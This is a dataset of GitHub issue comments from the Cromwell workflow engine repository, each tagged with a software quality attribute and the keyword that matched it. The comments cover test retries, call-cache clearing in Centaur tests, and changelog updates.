https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1012098813:42,Deployability,update,update,42,@mcovarr I forgot this before… you should update the changelog to include that statsdproxy was removed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1012098813
https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1012168472:68,Deployability,release,release,68,@cahrens as this is already merged I will add this as a TODO to the release ticket BT-509,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6646#issuecomment-1012168472
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:62,Availability,error,errors,62,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:234,Availability,failure,failure,234,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:429,Availability,error,error,429,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:1242,Availability,error,error,1242,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:905,Deployability,update,update,905,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:1021,Deployability,update,update,1021,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:399,Energy Efficiency,reduce,reduce,399,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:107,Performance,cache,cache,107,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:264,Performance,cache,cache,264,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:799,Performance,cache,cache,799,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:322,Security,access,access,322,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:229,Testability,test,test,229,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:588,Testability,test,test,588,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:1029,Testability,Test,TestFormulas,1029,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:98,Usability,clear,clearing,98,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:687,Usability,feedback,feedback,687,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134:787,Usability,clear,clear,787,"Submitting for discussion. This change should fix some of the errors of this type we're seeing by clearing cache for both relevant workflows instead of just one. However, it will only do so in the specific case where the initial test failure happens when checking cache behavior, because that's the only time we have easy access to the id of the associated workflow. My assumption is that this will reduce the likelihood of this error but not eliminate it. . Before going back and making a larger change to pass an object containing all relevant workflow ids through a bunch of different test code, to ensure it can always be part of `CentaurTestException`, I wanted to get some initial feedback. Is this (adding additional workflow id(s) to `CentaurTestException` so that we can easily clear their cache hits from the database in `tryTryAgain`) the right direction to fix this problem? It feels wrong to update the signatures of all these unrelated methods just to populate the exception. I also thought about trying to update `TestFormulas.runWorkflowTwiceExpectingCaching` and other similar methods to capture the raised `CentaurTestException`, add the additional workflow id(s), and rethrow, but didn't want to mess with the location the error is thrown from.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1016819134
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:206,Availability,failure,failure,206,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:257,Availability,resilien,resilient,257,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:270,Availability,failure,failures,270,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:388,Availability,robust,robust,388,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:791,Availability,robust,robust,791,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:129,Testability,test,test,129,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:407,Testability,test,tests,407,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:487,Testability,test,tests,487,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788:810,Testability,test,tests,810,"I think this change is probably the right way to go. My comment here is about centaur itself. In general, I dislike this kind of test retry. A single retry can hide the fact that a feature has a nearly 50% failure rate. I'd rather the system itself be more resilient to failures, along with having much fewer potentially-flaky full-system checks (though that relies on having a much more robust set of unit tests than we currently have). I also recognize that part of the value of these tests is to protect us from unexpected changes (intended or not) in Google's services. A strategy I've successfully used to decouple from an external service is to have the thinnest possible layer of full-system checks that verify our understanding of how that external system functions, then building a robust set of unit tests of our code based on that understanding.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6654#issuecomment-1017490788
https://github.com/broadinstitute/cromwell/pull/6655#issuecomment-1016963200:2,Availability,down,download,2,![download](https://user-images.githubusercontent.com/961771/150234480-e61224c2-c7e6-49cd-9bc2-fb721c682eee.jpg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6655#issuecomment-1016963200
https://github.com/broadinstitute/cromwell/pull/6655#issuecomment-1018010957:0,Testability,Test,Tested,0,"Tested end-to-end in dev and confirmed that Terra UI and Job Manager don't regress. I used the Firefox edit request feature to add an include key for `backendStatus` and it works as expected. <img width=""439"" alt=""Screen Shot 2022-01-20 at 6 14 44 PM"" src=""https://user-images.githubusercontent.com/1087943/150437153-24795533-dd2d-4ad1-866c-bd928a805db7.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6655#issuecomment-1018010957
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349:15,Testability,test,tests,15,Should all the tests with a call caching `testType` not retry or just specific ones? If it's all of them we should probably make sure retry is not applied for these in general rather than requiring the `.test` file to say that explicitly for each.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349:42,Testability,test,testType,42,Should all the tests with a call caching `testType` not retry or just specific ones? If it's all of them we should probably make sure retry is not applied for these in general rather than requiring the `.test` file to say that explicitly for each.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349:204,Testability,test,test,204,Should all the tests with a call caching `testType` not retry or just specific ones? If it's all of them we should probably make sure retry is not applied for these in general rather than requiring the `.test` file to say that explicitly for each.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1021653349
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:230,Integrability,depend,depending,230,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:55,Performance,cache,cache,55,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:192,Testability,test,test,192,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:274,Testability,test,test,274,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403
https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403:358,Testability,test,test,358,"Yeah, it's all of them - because all of them check the cache hit UUID and will fail if it's not the expected value. I'll take a look and see if there's a good way to prevent retries for these test formats in general. I agree that depending on people to add the flag to each test file is not great, but it seems nice for debugging - if you're wondering why a test didn't retry, this is the first place you'd look.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6657#issuecomment-1022241403
